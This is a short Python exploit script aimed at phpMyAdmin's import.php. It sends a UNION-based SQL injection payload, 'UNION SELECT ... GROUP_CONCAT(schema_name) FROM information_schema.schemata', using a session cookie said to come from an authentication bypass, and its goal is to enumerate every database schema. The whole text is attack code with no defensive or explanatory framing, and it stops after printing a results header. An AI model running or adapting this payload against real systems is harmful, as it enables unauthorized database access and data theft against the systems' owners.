import requests

target = "http://localhost/phpmyadmin/"
session_cookie = "9f57b107a363d3bcef9fedbe5f5cb45f"  # Obtained from auth bypass

# Extract all database names
injection = "1' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -"
params = {
    'db': 'mysql',
    'table': 'user',
    'sql_query': injection
}

headers = {'Cookie': f'phpMyAdmin={session_cookie}'}
response = requests.get(f"{target}import.php", params=params, headers=headers)

print("[+] Database Schemas Found:")